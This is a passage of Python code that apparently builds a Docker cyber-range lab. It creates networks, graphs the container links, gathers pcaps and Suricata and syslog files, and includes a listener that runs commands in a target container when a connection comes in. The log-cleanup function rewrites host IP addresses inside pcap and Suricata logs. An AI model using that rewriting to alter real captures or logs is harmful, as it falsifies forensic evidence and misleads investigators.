    print("{} network created - Subnet = {}".format(req_network,req_network_subnet))

    return req_network_subnet


def is_port_in_use(port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.bind(("127.0.0.1", port))
        except socket.error:
            return True
        return False


def sub_network_check(req_network):

    network_list = api_client.networks()

    network_subnets = []

    req_network_subnet = ""

    req_network_exists = False

    for network in network_list:
        if network["Name"] == req_network:
            req_network_subnet = network["IPAM"]["Config"][0]["Subnet"]
            print("{} network found - Subnet = {}".format(req_network,req_network_subnet))
            req_network_exists = True
            break
        if len(network["IPAM"]["Config"]) > 0:
            for i in range(0,len(network["IPAM"]["Config"])):
                network_subnets.append(network["IPAM"]["Config"][i]["Subnet"])

    if not req_network_exists:
        req_network_subnet = network_create(req_network,network_subnets)

    network_subnets = []

    return req_network_subnet


def create_Network_Graph(connected_containers,container_nodes):

    edge_input = connected_containers

    node_input = container_nodes

    G = nx.Graph()

    G.add_edges_from(edge_input)
    G.add_nodes_from(node_input)

    pos = nx.layout.kamada_kawai_layout(G)

    edge_x = []
    edge_y = []
    for edge in G.edges():
        x0, y0 = pos[edge[0]]
        x1, y1 = pos[edge[1]]
        edge_x.append(x0)
        edge_x.append(x1)
        edge_x.append(None)
        edge_y.append(y0)
        edge_y.append(y1)
        edge_y.append(None)

    edge_trace = go.Scatter(
        x=edge_x, y=edge_y,
        line=dict(width=0.5, color='#888'),
        hoverinfo='none',
        mode='lines',
        showlegend=False)

    node_x = []
    node_y = []
    node_str = []
    for node in G.nodes():
        x, y = pos[node]
        node_x.append(x)
        node_y.append(y)
        node_str.append(str(node))

    node_trace = go.Scatter(
        x=node_x, y=node_y,
        mode='markers+text',
        hoverinfo='text',
        text=node_str,
        marker=dict(
            color="red",
            size=10,
            line_width=2))


    fig = go.Figure(data=[edge_trace, node_trace],
                layout=go.Layout(
                title='Container Range Environment Setup',
                titlefont_size=16,
                showlegend=False,
                hovermode='closest',
                margin=dict(b=20,l=5,r=5,t=40),
                annotations=[ dict(
                    text="Connected containers indicate they have direct network access",
                    showarrow=False,
                    xref="paper", yref="paper",
                    x=0.005, y=-0.002 ) ],
                xaxis=dict(showgrid=False, zeroline=False, showticklabels=False),
                yaxis=dict(showgrid=False, zeroline=False, showticklabels=False))
                )

    fig.update_traces(textposition='top center', textfont_size=14, textfont_color="red")

    res = fig.to_html(full_html=False)

    return res


def log_clean_up(pcap_file_to_cleanup,container_logs_to_recover, suricata_log_dir, output_fldr):

    if not os.path.isdir(output_fldr):
        os.makedirs(output_fldr)

    with open("{}/{}".format(resource_file_path,pcap_file_to_cleanup), 'rb') as f:
        content = f.read()

    hex_str = binascii.hexlify(content).decode('ascii')
    rpl_hex_str = hex_str.replace("ac120001","ac12009d")

    file_str = binascii.unhexlify(rpl_hex_str)

    with open("{}/{}".format(output_fldr,pcap_file_to_cleanup), 'wb') as f:
        f.write(file_str)

    os.chown("{}/{}".format(output_fldr,pcap_file_to_cleanup),1001,1001)

    os.remove("{}/{}".format(resource_file_path,pcap_file_to_cleanup))

    for root, dirs, files in os.walk("{}/{}".format(resource_file_path,suricata_log_dir)):
        for file in [os.path.join(root, f) for f in files]:
            os.chown(file,1001,1001)
            os.chmod(file, stat.S_IRUSR | stat.S_IWUSR | stat.S_IRGRP | stat.S_IWGRP | stat.S_IROTH | stat.S_IWOTH)

            with open(file, 'r') as file_in :
                filedata = file_in.read()

            filedata = filedata.replace('"172.28.0.1"', '"172.28.0.157"')
            filedata = filedata.replace('172.28.0.1:', '172.28.0.157:')

            with open("{}/{}".format(output_fldr,os.path.basename(file)), 'w') as file_out:
                file_out.write(filedata)

            os.remove(file)

    containers_objects = docker_client.containers.list()
    running_containers = [x.name for x in containers_objects]

    for container in container_logs_to_recover:

        bits, _ = api_client.get_archive(container, '/var/log/syslog')

        tar_f = open('{}/{}_logs.tar'.format(output_fldr,container), 'wb')

        for chunk in bits:
            tar_f.write(chunk)
        tar_f.close()

    # Need to fix this
    for container in running_containers:

        logdata = api_client.logs(container)

        with open('{}/{}_dockerlogs.log'.format(output_fldr,container), 'wb') as dockerlog_file:
            dockerlog_file.write(logdata)

    #TODO add in elasticdump commands here

    # Need to dynamically pull the filebeat indices and then we should be good to just parse as a docker command

    #docker run --rm -it --name=elasticdump --net=uwe_tek_external -v $(pwd):/tmp elasticdump/elasticsearch-dump --input=http://172.28.0.10:9200/filebeat-7.17.2-2022.08.22-000001 --output=/tmp/filebeat_mapping.json --type=mapping
    #docker run --rm -it --name=elasticdump --net=uwe_tek_external -v $(pwd):/tmp ^Casticdump/elasticsearch-dump --input=http://172.28.0.10:9200/filebeat-7.17.2-2022.08.22-000001 --output=/tmp/filebeat_analyzer.json --type=analyzer
    #docker run --rm -it --name=elasticdump --net=uwe_tek_external -v $(pwd):/tmp elasticdump/elasticsearch-dump --input=http://172.28.0.10:9200/filebeat-7.17.2-2022.08.22-000001 --output=/tmp/filebeat_data.json --type=data


    print("\Stopping logging - Output files saved in {} - Containers are still running".format(output_fldr))

#args=("0.0.0.0",18200,listen_cmd,target_os, "target" )
def listen(ip,port,cmd,target_os,target_container):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((ip, port))
    s.listen(1)

    while True:

        print("Listening on port {}".format(str(port)))
        conn, addr = s.accept()
        print("Connection received from {}".format(addr))

        os_shell = "bash"

        if target_os.__contains__("alpine"):
            os_shell = "ash"

        wrapper_cmd = 'docker exec -it {} {} -c "{}"'.format(target_container,os_shell,cmd)

        subprocess.run(['gnome-terminal', '--', 'bash', '-c', wrapper_cmd], stderr=subprocess.STDOUT, stdout=subprocess.PIPE)

    conn.close()

def get_uwe_net_interface(ip_addr):

    uwe_net_interface = ""

    addrs = psutil.net_if_addrs()

    for key, val in addrs.items():
        for i in val:
            if ip_addr in i:
                uwe_net_interface = key
                break

    return uwe_net_interface
